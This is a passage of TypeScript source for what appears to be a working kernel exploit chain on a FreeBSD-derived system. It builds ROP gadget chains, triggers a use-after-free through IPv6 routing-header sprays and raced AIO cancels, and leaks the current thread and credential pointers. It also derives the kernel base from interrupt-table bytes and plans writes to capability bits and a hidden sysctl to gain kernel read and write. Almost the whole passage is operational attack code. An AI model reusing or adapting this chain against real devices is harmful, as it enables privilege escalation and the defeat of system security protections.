  rop.push(gadgets.POP_RDI_RET)
  rop.push(done_signal)
  rop.push(gadgets.POP_RAX_RET)
  rop.push(new BigInt(1))
  rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET)

  const loop_end = rop.length
  return { rop, loop_size: loop_end - loop_init }
}

function rop_regen_and_loop (last_rop_entry: BigInt, number_entries: number) {
  let new_rop_entry = last_rop_entry.add(8)
  let copy_entry = last_rop_entry.sub(number_entries * 8).add(8)
  const rop_loop = last_rop_entry.sub(number_entries * 8).add(8)
  for (let i = 0; i < number_entries; i++) {
    const entry_add = copy_entry
    const entry_val = read64(copy_entry)
    write64(new_rop_entry.add(0x0), gadgets.POP_RDI_RET)
    write64(new_rop_entry.add(0x8), entry_add)
    write64(new_rop_entry.add(0x10), gadgets.POP_RAX_RET)
    write64(new_rop_entry.add(0x18), entry_val)
    write64(new_rop_entry.add(0x20), gadgets.MOV_QWORD_PTR_RDI_RAX_RET)
    copy_entry = copy_entry.add(8)
    new_rop_entry = new_rop_entry.add(0x28)
  }
  write64(new_rop_entry.add(0x0), gadgets.POP_RSP_RET)
  write64(new_rop_entry.add(0x8), rop_loop)
}

function spawn_thread (rop_array: BigInt[], loop_entries: number) {
  const rop_addr = malloc(0x600)
  for (let i = 0; i < rop_array.length; i++) {
    write64(rop_addr.add(i * 8), rop_array[i]!)
  }
  if (loop_entries !== 0) {
    const last_rop_entry = rop_addr.add(rop_array.length * 8).sub(8)
    rop_regen_and_loop(last_rop_entry, loop_entries)
  }
  const jmpbuf = malloc(0x60)
  write64(jmpbuf.add(0x00), gadgets.RET)
  write64(jmpbuf.add(0x10), rop_addr)
  write32(jmpbuf.add(0x40), saved_fpu_ctrl)
  write32(jmpbuf.add(0x44), saved_mxcsr)

  const stack_size = new BigInt(0x100)
  const tls_size = new BigInt(0x40)
  const stack = malloc(Number(stack_size))
  const tls = malloc(Number(tls_size))
  write64(spawn_thr_args.add(0x00), longjmp_addr)
  write64(spawn_thr_args.add(0x08), jmpbuf)
  write64(spawn_thr_args.add(0x10), stack)
  write64(spawn_thr_args.add(0x18), stack_size)
  write64(spawn_thr_args.add(0x20), tls)
  write64(spawn_thr_args.add(0x28), tls_size)
  write64(spawn_thr_args.add(0x30), spawn_tid)
  write64(spawn_thr_args.add(0x38), spawn_cpid)
  const result = thr_new(spawn_thr_args, 0x68)
  if (!result.eq(BigInt_Zero)) {
    throw new Error('thr_new failed: ' + hex(result))
  }
  return read64(spawn_tid)
}

function create_cancel_worker () {
  const pipes = buf(8)
  socketpair(AF_UNIX, SOCK_STREAM, 0, pipes.ad)
  pipe_0 = pipes.dv.getInt32(0, true)
  pipe_1 = pipes.dv.getInt32(4, true)
  // keep the pipe fds out of the reopen list; never closed by cleanup
  sigAb = new ArrayBuffer(8)
  keepAlive.push(sigAb)
  readyAb = new ArrayBuffer(8)
  keepAlive.push(readyAb)
  doneAb = new ArrayBuffer(8)
  keepAlive.push(doneAb)
  readyAd = bufAddr(readyAb)
  doneAd = bufAddr(doneAb)

  spawn_thr_args = malloc(0x80)
  spawn_tid = malloc(8)
  spawn_cpid = malloc(8)

  const wl = cancel_worker_rop(readyAd, new BigInt(pipe_0), doneAd, bufAddr(sigAb))
  spawn_thread(wl.rop, wl.loop_size)
  trace('PR-WORKER-SPAWNED', 'core=' + WORKER_CORE + ' pipe=' + pipe_0 + '/' + pipe_1)
  if (!wait_for(readyAd, new BigInt(1), 4000)) {
    throw new Error('cancel worker did not signal ready')
  }
  mark('PR-WORKER-READY', 'parked-on-pipe=' + pipe_0)
}

function fire_cancel (): boolean {
  try {
    write(new BigInt(pipe_1), bufAddr(sigAb), 1)
    return true
  } catch (e) {
    return false
  }
}

// ---------------------------------------------------------------------------
// Node/file primitives
// ---------------------------------------------------------------------------
function setNode0 (nextAddr: BigInt, secondDec: BigInt) {
  new Uint8Array(pAb).fill(0)
  pDv.setUint8(1, RTH_LEN)
  pDv.setUint8(3, RTH_SEGLEFT)
  put64(pDv, 0x08, secondDec)
  put64(pDv, 0x10, M_AD)
  put64(pDv, 0x30, nextAddr)
}

function wnode (i: number, decAddr: BigInt, sinkAddr: BigInt, last: boolean) {
  const o = i * NODE_SZ
  put64(arDv, o + 0x00, decAddr)
  put64(arDv, o + 0x08, sinkAddr)
  put64(arDv, o + 0x10, M_AD)
  put64(arDv, o + 0x30, last ? BigInt_Zero : arAd.add(o + NODE_SZ))
}

function armOnce (): string {
  const g = armCount + 1
  // P1: free rthdr from pool (uaf)
  for (const fd of POOL) {
    setsockopt(fd, IPPROTO_IPV6, IPV6_RTHDR, BigInt_Zero, 0)
  }
  // P2: submit 2 read requests against the main pair
  const rs = Number(aio_submit_cmd(1 | 0x1000, rqAd, 2, 3, idAd2).lo)
  if (rs !== 0) {
    return 'submit=' + rs
  }
  // P3: wait (timeout) so both requests stay PENDING
  toDv.setUint32(0, TOWAIT, true)
  toDv.setUint32(4, 0, true)
  const tw0 = Date.now()
  aio_multi_wait(idAd2, 2, stAd2, 0, toAd as unknown as number)
  const waitMs = Date.now() - tw0
  // P4: spray rthdr onto pool sockets (reclaim node0 with our fake)
  let n = 0
  for (const fd of POOL) {
    if (Number(setsockopt(fd, IPPROTO_IPV6, IPV6_RTHDR, pAd, RTH_SIZE).lo) === 0) n++
  }
  armCount++
  trace('ARM-FIN', 'a=' + g + ' sprayed=' + n + ' wait=' + waitMs + 'ms')
  return 'ok sprayed=' + n + ' wait=' + waitMs + 'ms'
}

function whoHasF () {
  let found = -1
  let hits = 0
  let state0 = 0
  for (let i = 0; i < POOL.length; i++) {
    glDv.setInt32(0, RTH_SIZE, true)
    glDv.setInt32(4, 0, true)
    new Uint8Array(gfAb).fill(0)
    if (Number(getsockopt(POOL[i], IPPROTO_IPV6, IPV6_RTHDR, gfAd, glAd).lo) !== 0) continue
    const st = gfDv.getUint32(0x20, true) >>> 0
    if (st !== 0) {
      hits++
      if (found < 0) {
        found = i
        state0 = st
      }
    }
  }
  return { idx: found, hits, state: state0 }
}

function reapNow (tag: string) {
  if (reapedGen === armCount) return
  wnode(0, DUM, DUM, true)
  reapedGen = armCount
  const c = Number(aio_multi_cancel(idAd2, 2, stAd2).lo)
  const p = Number(aio_multi_poll(idAd2, 2, stAd2).lo)
  const d = Number(aio_multi_delete(idAd2, 2, stAd2).lo)
  trace('REAP', tag + ' gen=' + reapedGen + ' cancel=' + c + ' poll=' + p + ' delete=' + d)
}

function runChain (nNodes: number, label: string): number | null {
  snkDv.setInt32(0x00, 0x40000000, true)
  snkDv.setInt32(N0SINK_OFF, 0x40000000, true)
  mU32[OWNER_LO] = 4
  mU32[OWNER_HI] = 0
  setNode0(arAd, snkAd.add(N0SINK_OFF))
  const a = armOnce()
  if (a.indexOf('ok') !== 0) {
    mark('PR-ARM-FAIL', label + ' ' + a)
    return null
  }
  trace('CH-CANCEL', label + ' nodes=' + nNodes + ' walking')
  aio_multi_cancel(idAd2, 1, stAd2)
  const moved = 0x40000000 - snkDv.getInt32(0x00, true)
  const n0 = 0x40000000 - snkDv.getInt32(N0SINK_OFF, true)
  const w = DEBUG_F ? whoHasF() : { idx: -9, hits: 0, state: 0 }
  mark('PR-FIRE', label + ' nodes=' + nNodes + ' sink_moved=' + moved + ' node0_sink=' + n0 + ' f_socket=' + w.idx + ' f_hits=' + w.hits + ' state=0x' + w.state.toString(16) + ' (' + a + ')')
  if (n0 === 1 && w.idx < 0) {
    mark('PR-F-UNSEEN', 'node0 fired but no pool socket carries the state write')
  }
  reapNow('a=' + armCount)
  return moved
}

// ---------------------------------------------------------------------------
// PHASE 1: setup
// ---------------------------------------------------------------------------
function relapse_setup () {
  // per-attempt state reset (in-process benign retries reuse big arenas)
  armCount = 0
  reapedGen = -1
  capsPend = 0
  lkFillIdx = 0
  spinI = 0
  spinHits = 0
  spinHitLo = 0
  spinHitHi = 0
  spinSamples.length = 0
  for (const keyB in B) delete B[keyB]
  CT1 = null
  UCRED = null
  KBASE = null
  CAPS_B = null
  CAPS_PR = null
  close_fd_list(POOL)
  if (kfSock >= 0) { close_fd(kfSock); kfSock = -1 }

  mark('PR-CFG', 'nleak=' + N_LEAK + ' spray=' + SPRAY + ' spin=' + SPIN + ' chunk=' + SPIN_CHUNK + ' ka=' + KA + ' towait=' + TOWAIT)
  mmap_scratch()
  relapse_init_threading()
  if (PINCORE < 0) pin_main()
  WORKER_CORE = OTHER

  const lkLst = buf(0x40)
  lkAb2 = lkLst.ab
  lkDv2 = lkLst.dv
  lkAd2 = lkLst.ad
  LX = lkAd2.add(0) // leak sink counters
  LC = lkAd2.add(0x10) // leak-side node0 counter

  alloc_arenas()
  mk_arming_buffers()
  mSaturate()
  pool_create()

  const gfLst = buf(0x80)
  gfAb = gfLst.ab
  gfDv = gfLst.dv
  gfAd = gfLst.ad
  const glLst = buf(8)
  glAb = glLst.ab
  glDv = glLst.dv
  glAd = glLst.ad
  const dumLst = buf(0x40)
  dumAb = dumLst.ab
  dumDv = dumLst.dv
  dumAd = dumLst.ad
  dumDv.setInt32(0x00, 0x40000000, true)
  DUM = dumAd.add(0x00)
  const snkLst = buf(0x40)
  snkAb = snkLst.ab
  snkDv = snkLst.dv
  snkAd = snkLst.ad
  SNK = snkAd.add(0x00)

  if (!relapse_dead) {
    try {
      create_cancel_worker()
    } catch (e) {
      relapse_fail('worker: ' + (e as Error).message, false)
      return
    }
  }
  if (!relapse_dead) yield_to_render(relapse_arm)
}

// ---------------------------------------------------------------------------
// PHASE 2a: build lkNodes arena (chunked)
// ---------------------------------------------------------------------------
function relapse_arm () {
  // chunk-adaptive N_LEAK: keep 001MB cap if mem tight? (keep simple: literal)
  const total = N_LEAK
  const nodes_per_chunk = 65536
  while (lkFillIdx < total) {
    const sliceStart = lkFillIdx
    const sliceEnd = sliceStart + nodes_per_chunk < total ? sliceStart + nodes_per_chunk : total
    for (let i = sliceStart; i < sliceEnd; i++) {
      const o = i * NODE_SZ
      put64(lkDv, o + 0x00, LX)
      put64(lkDv, o + 0x08, LC)
      put64(lkDv, o + 0x10, M_AD)
      put64(lkDv, o + 0x30, i === total - 1 ? BigInt_Zero : lkNad.add(o + NODE_SZ))
    }
    lkFillIdx = sliceEnd
    if (sliceEnd < total) {
      yield_to_render(relapse_arm)
      return
    }
  }
  if (lkFillIdx > 0 && lkFillIdx < total) return

  // arena ready: prearm once here
  toDv.setUint32(0, TOWAIT, true)
  toDv.setUint32(4, 0, true)
  lkFillIdx = 0
  if (!relapse_dead) yield_to_render(relapse_leak_pre)
}

function relapse_leak_pre () {
  lkDv2.setInt32(0x00, 0x40000000, true)
  lkDv2.setInt32(0x10, 0x40000000, true)
  mU32[OWNER_LO] = 4
  mU32[OWNER_HI] = 0
  setNode0(lkNad, lkAd2.add(0x10))
  const a = armOnce()
  if (a.indexOf('ok') !== 0) {
    relapse_fail('leak-pre-arm: ' + a, true)
    return
  }
  // warm-up: dirty owner neighborhood so the walk finds data to evolve on
  leakWu = 0
  {
    const mu8 = mU8
    const mu32 = mU32
    const ol = OWNER_LO
    for (let i = 0; i < WARMUP; i++) {
      mu8[0x30 + (i & 15)] = i & 0xff
      leakWu ^= mu32[ol]
    }
  }
  spinI = 0
  spinHits = 0
  spinHitLo = 0
  spinHitHi = 0
  spinSamples.length = 0
  if (!fire_cancel()) {
    relapse_fail('fire: pipe write failed', false)
    return
  }
  yield_to_render(relapse_leak_spin)
}

// ---------------------------------------------------------------------------
// PHASE 2b: chunked spin (owner-stamp leak) → CT1
// ---------------------------------------------------------------------------
function relapse_leak_spin () {
  const chunk = SPIN_CHUNK
  const end = spinI + chunk < SPIN ? spinI + chunk : SPIN
  const mu8 = mU8
  const mu32 = mU32
  const ol = OWNER_LO
  const oh = OWNER_HI
  for (let i = spinI; i < end; i++) {
    mu8[0x30 + (i & 15)] = i & 0xff
    const hi1 = mu32[oh]
    if (hi1 !== 0) {
      const lo = mu32[ol]
      const hi2 = mu32[oh]
      if (hi1 === hi2 && lo !== 4) {
        if (spinHits === 0) {
          spinHitLo = lo
          spinHitHi = hi1
        }
        spinHits++
        if (spinSamples.length < 32) {
          spinSamples.push((hi1 >>> 0).toString(16).padStart(8, '0') + (lo >>> 0).toString(16).padStart(8, '0'))
        }
        if (spinHits > 48) {
          spinI = end
          yield_to_render(relapse_leak_finish)
          return
        }
      }
    }
  }
  spinI = end
  if (spinI < SPIN) {
    yield_to_render(relapse_leak_spin)
    return
  }
  yield_to_render(relapse_leak_finish)
}

function relapse_leak_finish () {
  const uniq: Record<string, number> = {}
  for (const v of spinSamples) uniq[v] = (uniq[v] || 0) + 1
  const keys = Object.keys(uniq)
  const drop = 0x40000000 - lkDv2.getInt32(0x00, true)
  mark('PR-LEAK', 'hits=' + spinHits + ' walked=' + drop + '/' + N_LEAK + ' uniq=' + keys.length)
  if (!spinHits || (spinHitHi >>> 0) < 0xffff0000 || keys.length !== 1) {
    // curthread leak did not stick
    relapse_reapleak()
    relapse_fail('leak: no owner stamp', true)
    return
  }
  // polpNO int64(hitLo, hitHi) -> Vue BigInt(hi, lo)
  CT1 = new BigInt(spinHitHi >>> 0, spinHitLo >>> 0)
  mark('PR-LEAK-HIT', 'curthread=' + hex(CT1 as BigInt))
  relapse_reapleak()
  relapse_pass_prelims()
}

function relapse_reapleak () {
  put64(lkDv, 0x00, LX)
  put64(lkDv, 0x08, LC)
  put64(lkDv, 0x30, BigInt_Zero)
  const rlc = fdOf(aio_multi_cancel(idAd2, 2, stAd2))
  const rlp = fdOf(aio_multi_poll(idAd2, 2, stAd2))
  const rld = fdOf(aio_multi_delete(idAd2, 2, stAd2))
  mark('PR-REAPLEAK', 'cancel=' + rlc + ' poll=' + rlp + ' delete=' + rld)
}

// relapse pass-prelude: build dum/snk. NOTE: polpNO sequence order: passA target
// computed exactly at this point.
function relapse_pass_prelims () {
  if (CT1 === null) {
    relapse_fail('pass: no CT1', true)
    return
  }
  yield_to_render(relapse_pass)
}

// ---------------------------------------------------------------------------
// PHASE 3: passA/passB (decrement oracle) → UCRED
// ---------------------------------------------------------------------------
function relapse_pass () {
  if (CT1 === null) {
    relapse_fail('pass: no CT1', true)
    return
  }
  const X1 = (CT1 as BigInt).add(TD_UCRED_OFF)
  mark('PR-PASSA-TARGET', 'X1=curthread+0x130 (td_ucred)=' + hex(X1) + ' KA=' + KA + ' pair=0x' + PAIR.toString(16))

  let i = 0
  for (let j = 0; j < KA; j++) {
    wnode(i++, X1.add(STEP_OFF), DUM, false)
    wnode(i++, X1, SNK, false)
  }
  const subA = (0x100000000 - ((KA * PAIR) % 0x100000000)) % 0x100000000
  const dA = [subA & 0xff, (subA >>> 8) & 0xff, (subA >>> 16) & 0xff, (subA >>> 24) & 0xff]
  const nA = dA[0]! + dA[1]! + dA[2]! + dA[3]!
  mark('PR-RESTOREA', 'passA subtract=' + subA + ' digits=' + dA.join(',') + ' nodes=' + nA)
  if (!check('pr-restorea-bounded', nA >= 1 && nA <= 1020, 'n=' + nA)) {
    relapse_fail('passA digits out of bounds', true)
    return
  }
  const pa: number[] = []
  for (let j = 0; j < 4; j++) for (let d = 0; d < dA[j]!; d++) pa.push(j)
  for (let j = 0; j < pa.length; j++) {
    wnode(i++, X1.add(pa[j]!), DUM, j === pa.length - 1)
  }
  const mA = runChain(i, 'passA')
  if (mA === null) {
    relapse_fail('passA: arming failed', true)
    return
  }
  if (mA <= 0) {
    mark('PR-PASSA-NOCROSS', 'no crossing: low dword either exceeds ' + (KA * PAIR) + ' or is already negative')
    relapse_fail('passA nocross', true)
    return
  }
  const kA = KA - mA + 1
  mark('PR-PASSA', 'm=' + mA + ' -> k=' + kA + ' W0 in (' + ((kA - 1) * PAIR) + ', ' + (kA * PAIR) + ']')

  // passB
  const RED = (kA - 1) * PAIR
  const dga = [RED & 0xff, (RED >>> 8) & 0xff, (RED >>> 16) & 0xff, (RED >>> 24) & 0xff]
  const nDga = dga[0]! + dga[1]! + dga[2]! + dga[3]!
  mark('PR-RESTORE-PLAN', 'reduce=' + RED + ' digits=' + dga.join(',') + ' nodes=' + nDga)
  if (!check('pr-restore-bounded', nDga > 0 && nDga <= 1020 && RED > 0, 'n=' + nDga)) {
    relapse_fail('k reduction out of bounds', true)
    return
  }
  const X2 = X1 // same copy (two-threaded wl-less port: 1 worker only)
  let W0 = 0
  {
    let ib = 0
    const posA: number[] = []
    for (let j = 0; j < 4; j++) for (let d = 0; d < dga[j]!; d++) posA.push(j)
    for (let j = 0; j < posA.length; j++) {
      wnode(ib++, X2.add(posA[j]!), DUM, false)
    }
    for (let j = 0; j < KB; j++) wnode(ib++, X2, SNK, false)
    const totB = (RED + KB) % 0x100000000
    const subB = (0x100000000 - totB) % 0x100000000
    const dB = [subB & 0xff, (subB >>> 8) & 0xff, (subB >>> 16) & 0xff, (subB >>> 24) & 0xff]
    const nB = dB[0]! + dB[1]! + dB[2]! + dB[3]!
    mark('PR-RESTOREB', 'passB subtract=' + totB + ' digits=' + dB.join(',') + ' nodes=' + nB)
    if (!check('pr-restoreb-bounded', nB >= 1 && nB <= 1020, 'n=' + nB)) {
      mark('REFUSING-TO-ARM', 'reason=passb-restore-empty')
      relapse_fail('passB out of bounds', true)
      return
    }
    const pb: number[] = []
    for (let j = 0; j < 4; j++) for (let d = 0; d < dB[j]!; d++) pb.push(j)
    for (let j = 0; j < pb.length; j++) {
      wnode(ib++, X2.add(pb[j]!), DUM, j === pb.length - 1)
    }
    const mB = runChain(ib, 'passB')
    if (mB === null) {
      relapse_fail('passB: arming failed', true)
      return
    }
    if (mB <= 0) {
      mark('PR-PASSB-NOCROSS', 'remainder never crossed -- k may be off by one, or the two threads td_proc differ')
      relapse_fail('passB nocross', true)
      return
    }
    const R = KB - mB + 1
    W0 = (kA - 1) * PAIR + R
    mark('PR-PASSB', 'm=' + mB + ' -> R=' + R + ' => low dword = ' + W0 + ' (0x' + (W0 >>> 0).toString(16) + ')')
  }

  const ct_hi = (CT1 as BigInt).hi >>> 0
  UCRED = new BigInt(ct_hi, W0 >>> 0)
  mark('PR-UCRED', 'ucred=' + hex(UCRED as BigInt) + ' (high dword from leaked curthread 0x' + ct_hi.toString(16) + ')')
  check('pointer-read-shape-ok', (W0 >>> 0) !== 0 && ((W0 >>> 0) & 7) === 0, 'low=0x' + (W0 >>> 0).toString(16) + ' aligned8=' + (((W0 >>> 0) & 7) === 0).toString())
  yield_to_render(relapse_anchor_head)
}

// anchor head
function relapse_anchor_head () {
  const RVA_RSVD = K_TABLE!.idt_rsvd
  const Bobj = B
  const JC: Record<string, number> = {}
  const JOBS: { n: string, j: number, g: number, want: number | null, low: () => number }[] = [
    { n: 'b0', j: 0, g: 22, want: null, low: () => 0x000000 },
    { n: 'b1', j: 1, g: 24, want: null, low: () => ((Bobj.b0 << 16) >>> 0) },
    { n: 'b3', j: 3, g: 25, want: 0x00, low: () => ((0x20 << 16) | ((Bobj.b1 || JC.b1 || 0) << 8) | (Bobj.b0 || JC.b0 || 0)) >>> 0 },
    { n: 'b5', j: 5, g: 26, want: 0x8e, low: () => 0x000020 },
    { n: 'b6', j: 6, g: 27, want: null, low: () => 0x8e0000 },
    { n: 'b7', j: 7, g: 31, want: null, low: () => (((Bobj.b6 || 0) << 16) | 0x8e00) >>> 0 },
    { n: 'b6d', j: 6, g: 20, want: null, low: () => 0x8e0000 },
    { n: 'b7d', j: 7, g: 15, want: null, low: () => (((Bobj.b6 || 0) << 16) | 0x8e00) >>> 0 }
  ]
  const NJ = JOBS.length
  const NEED = NJ * SWEEP * 2
  mark('ANCHOR-PLAN', 'rva_rsvd=0x' + RVA_RSVD.toString(16) + ' jobs=' + NJ + ' sweep=' + SWEEP + ' nodes=' + NEED + ' armings=' + armCount)
  if (!check('anchor-nodes-bounded', NEED <= MAXN && SWEEP >= 8 && SWEEP <= 1024, 'need=' + NEED + ' arena=' + MAXN)) {
    relapse_fail('anchor plan bounds', false)
    return
  }
  // span-sanity gate
  {
    let lo = 0x1000000
    let hi = -1
    for (let q = 0; q < NJ; q++) {
      const o = JOBS[q]!.g * GATE_SZ + JOBS[q]!.j
      if (o - 3 < lo) lo = o - 3
      if (o + 3 > hi) hi = o + 3
    }
    if (!check('anchor-inside-idt', lo >= 0 && hi < 0x1000, 'lo=+0x' + lo.toString(16) + ' hi=+0x' + hi.toString(16))) {
      relapse_fail('anchor span', false)
      return
    }
  }

  for (let i = 0; i < NJ * SWEEP; i++) anDv.setInt32(i * 4, 0x40000000, true)
  let idx = 0
  for (let q = 0; q < NJ; q++) {
    const o = JOBS[q]!.g * GATE_SZ + JOBS[q]!.j
    const stepAd = IDT.add(o)
    const probeAd = IDT.add(o - 3)
    for (let k = 0; k < SWEEP; k++) {
      wnode(idx++, stepAd, DUM, false)
      wnode(idx++, probeAd, anAd.add((q * SWEEP + k) * 4), false)
    }
  }
  put64(arDv, (idx - 1) * NODE_SZ + 0x30, BigInt_Zero)
  const rc = runChain(idx, 'anchor-sweep')
  if (rc === null) {
    relapse_fail('anchor-sweep: arming failed', false)
    return
  }

  let bad = 0
  for (let q = 0; q < NJ; q++) {
    const J = JOBS[q]!
    let ones = 0
    let edge = -1
    let bits = 0
    let pf = false
    dm_zeroObs()
    for (let k = 0; k < SWEEP; k++) {
      const f = 0x40000000 - anDv.getInt32((q * SWEEP + k) * 4, true) > 0
      bits = ((bits << 1) | (f ? 1 : 0)) | 0
      if ((k & 31) === 31) {
        DM_OBS[k >> 5] = bits
        bits = 0
      }
      if (f) ones++
      if (k > 0 && f !== pf && edge < 0) edge = k
      pf = f
    }
    if ((SWEEP & 31) !== 0) DM_OBS[SWEEP >> 5] = bits
    const low = J.low()
    const d = dm_decode(low)
    if (d.b >= 0) B[J.n] = d.b
    else B[J.n] = -1
    if (d.b < 0 || d.n !== 1) bad++
    mark('ANCHOR-BYTE', J.n + ' gate=' + J.g + ' j=' + J.j + ' low=0x' + low.toString(16) + ' ones=' + ones + ' edge=' + edge + ' cands=' + d.n + ' val=' + (d.b < 0 ? 'NO-MATCH' : '0x' + d.b.toString(16)))
    if (J.want !== null) {
      check('anchor-control-' + J.n, d.b === J.want, 'want=0x' + J.want.toString(16) + ' got=' + (d.b < 0 ? 'none' : '0x' + d.b.toString(16)))
    }
  }
  if (!check('anchor-every-byte-unique', bad === 0, 'nomatch=' + bad + ' jobs=' + NJ)) {
    // IDT hypothesis failure: retry (benign) so the next attempt can swap
    // idt_rsvd to the 13.00 neighbour (IDT-ALT) instead of failing outright.
    relapse_fail('anchor decode', true)
    return
  }
  check('anchor-duplicates-agree', B.b6 === B.b6d && B.b7 === B.b7d, 'b6=' + B.b6 + ' b6d=' + B.b6d + ' b7=' + B.b7 + ' b7d=' + B.b7d)
  const handlerLo = (((B.b7! << 24) >>> 0) + ((B.b6! << 16) >>> 0) + (B.b1! << 8) + B.b0!) >>> 0
  const kbLo = (handlerLo - RVA_RSVD) >>> 0
  KBASE = new BigInt(0xffffffff, kbLo)
  mark('ANCHOR-HANDLER', 'handler=0xffffffff' + handlerLo.toString(16).padStart(8, '0') + ' rva=0x' + RVA_RSVD.toString(16))
  const kbAligned = (kbLo & 0x3fff) === 0
  check('ANCHOR-KERNEL-BASE', kbAligned, 'kernel_base=' + hex(KBASE as BigInt) + ' aligned0x4000=' + (kbAligned ? 1 : 0) + ' low=0x' + kbLo.toString(16))
  if (!kbAligned) {
    // Same IDT hypothesis failure as above: retry with the alternate gate.
    relapse_fail('kernel base not aligned', true)
    return
  }
  yield_to_render(relapse_rw)
}

// ---------------------------------------------------------------------------
// PHASE 4: CAPS + KRW sysctl-oid window → kernel.read_buffer/write_buffer
// ---------------------------------------------------------------------------
function relapse_rw () {
  const OID = (KBASE as BigInt).add(K_TABLE!.oid_kern_file)
  const O_NUM = OID.add(0x10)
  const O_VIS = OID.add(0x50)
  const O_RAN = OID.add(0x54)
  mark('KF-TARGETS', 'oid=' + hex(OID) + ' oid_number=' + hex(O_NUM) + ' ran=' + hex(O_RAN))

  // multiFire helper (sweep + oracle mix, single arming)
  const multiFire = function (jobs: { kind: string, step?: BigInt, probe?: BigInt, low?: number, addr?: BigInt, n?: number }[], label: string) {
    let need = 0
    for (const j of jobs) need += j.kind === 'sweep' ? SWEEP * 2 : (j.n || 0)
    mark('MF-PLAN', label + ' jobs=' + jobs.length + ' nodes=' + need)
    if (!check('mf-bounded-' + label, need > 0 && need <= MAXN, 'need=' + need + ' arena=' + MAXN)) return null
    let nSink = 0
    for (const j of jobs) nSink += j.kind === 'sweep' ? SWEEP : (j.kind === 'oracle' ? 1 : 0)
    const sLst = buf(4 * (nSink < 1 ? 1 : nSink))
    const sDv = sLst.dv
    const sAd = sLst.ad
    for (let k = 0; k < nSink; k++) sDv.setInt32(k * 4, 0x40000000, true)
    let i = 0
    let sk = 0
    const base: number[] = []
    for (const j of jobs) {
      base.push(sk)
      if (j.kind === 'sweep') {
        for (let k = 0; k < SWEEP; k++) {
          wnode(i++, j.step!, DUM, false)
          wnode(i++, j.probe!, sAd.add((sk + k) * 4), false)
        }
        sk += SWEEP
      } else if (j.kind === 'oracle') {
        for (let k = 0; k < (j.n || 0); k++) {
          wnode(i++, j.addr!, sAd.add(sk * 4), false)
        }
        sk += 1
      } else {
        for (let k = 0; k < (j.n || 0); k++) {
          wnode(i++, j.addr!, DUM, false)
        }
      }
    }
    if (i === 0) return null
    put64(arDv, (i - 1) * NODE_SZ + 0x30, BigInt_Zero)
    if (runChain(i, label) === null) return null
    const out: unknown[] = []
    for (let q = 0; q < jobs.length; q++) {
      const j = jobs[q]!
      if (j.kind === 'sweep') {
        dm_zeroObs()
        let bits = 0
        for (let k = 0; k < SWEEP; k++) {
          const f = 0x40000000 - sDv.getInt32((base[q]! + k) * 4, true) > 0
          bits = ((bits << 1) | (f ? 1 : 0)) | 0
          if ((k & 31) === 31) {
            DM_OBS[k >> 5] = bits
            bits = 0
          }
        }
        if ((SWEEP & 31) !== 0) DM_OBS[SWEEP >> 5] = bits
        const d = dm_decode(j.low || 0)
        out.push({ b: d.b, n: d.n })
      } else if (j.kind === 'oracle') {
        const m = 0x40000000 - sDv.getInt32(base[q]! * 4, true)
        out.push({ m, v: m > 0 ? (j.n || 0) - m + 1 : 0 })
      } else {
        out.push({ n: j.n || 0 })
      }
    }
    return out
  }

  CAPS_B = (UCRED as BigInt).add(0x67)
  CAPS_PR = (UCRED as BigInt).add(0x64)
  const mf1 = multiFire([
    { kind: 'sweep', step: CAPS_B as BigInt, probe: CAPS_PR as BigInt, low: 0x000000 },
    { kind: 'oracle', addr: O_NUM, n: ONUM_N }
  ], 'caps-byte+oid_number')
  if (mf1 === null) {
    relapse_fail('caps/oid oracles failed', false)
    return
  }
  const cb = mf1[0] as { b: number, n: number }
  const on = mf1[1] as { m: number, v: number }

  const bLo = (cb.b - 1) & 0xff
  const bHi = cb.b
  const setLo = (bLo & 0x40) !== 0
  const setHi = (bHi & 0x40) !== 0
  mark('CAPS-BYTE', 'b=' + (cb.b < 0 ? 'NO-MATCH' : '0x' + cb.b.toString(16)) + ' cands=' + cb.n)
  if (!check('caps-byte-decoded', cb.b >= 0 && cb.n === 1, 'b=' + cb.b + ' cands=' + cb.n)) {
    relapse_fail('caps decode', false)
    return
  }

  let capsWrote = 0
  if (setLo && setHi) {
    mark('CAPS-SKIP', 'bit62 set for both candidates -- no write')
  } else {
    const dN = (bHi + 1) & 0xff
    const fin = [(bHi - dN) & 0xff, (bLo - dN) & 0xff, (bHi - dN - 1) & 0xff, (bLo - dN - 1) & 0xff]
    const allSet = fin.every(v => (v & 0x40) !== 0)
    mark('CAPS-PLAN', 'decrement by ' + dN + ' finals=' + fin.map(v => '0x' + v.toString(16)).join(','))
    if (!check('caps-plan-ok', dN > 0 && dN <= 0x100 && allSet, 'n=' + dN)) {
      relapse_fail('caps plan', false)
      return
    }
    capsPend = dN
  }

  // kf-target socket
  kfSock = Number(socket(AF_INET6, SOCK_DGRAM, 0).lo)
  if (kfSock >= 0) {
    opened.push(kfSock)
    const tAb = buf(4)
    tAb.dv.setInt32(0, KF_MARK, true)
    setsockopt(kfSock, IPPROTO_IPV6, IPV6_TCLASS, bufAddr(tAb.ab), 4)
  }
  if (!check('kf-target-socket', kfSock >= 0, 'fd=' + kfSock + ' tclass=0x' + KF_MARK.toString(16))) {
    relapse_fail('kf socket', false)
    return
  }

  // sysctl mib for kern.file
  const mibLst = buf(8)
  mibAb = mibLst.ab
  mibDv = mibLst.dv
  mibAd = mibLst.ad
  mibDv.setInt32(0, 1, true)
  mibDv.setInt32(4, KERN_FILE_NUM, true)
  const kfAb = new ArrayBuffer(KF_BYTES)
  keepAlive.push(kfAb)
  const kfAd = bufAddr(kfAb)
  const olLst = buf(8)
  olAb = olLst.ab
  olDv = olLst.dv
  olAd = olLst.ad

  const kernFileCheck = function (tag: string) {
    olDv.setInt32(0, 0, true)
    olDv.setInt32(4, 0, true)
    const r = sysctl(mibAd, 2, BigInt_Zero, olAd, BigInt_Zero, 0)
    const rv = Number(r.lo) | 0
    const er = rv < 0 ? relapse_errno() : 0
    const ln = olDv.getUint32(0, true)
    mark('KF-SYSCTL', tag + ' rv=' + rv + ' errno=' + er + ' oldlen=' + ln)
    return { rv, err: er, len: ln }
  }
  const base0 = kernFileCheck('baseline')
  check('kf-baseline-is-enoent', base0.rv < 0 && base0.err === 2, 'rv=' + base0.rv + ' errno=' + base0.err + ' (unhidden OID is not callable by default)')
  mark('KF-OIDNUM', 'v=' + on.v + ' want=' + KERN_FILE_NUM + ' kernel_base=' + hex(KBASE as BigInt))
  if (!check('KF-ANCHOR-CONFIRMED', on.v === KERN_FILE_NUM, 'oid_number=' + on.v + ' want=' + KERN_FILE_NUM)) {
    relapse_fail('KF anchor mismatch', false)
    return
  }

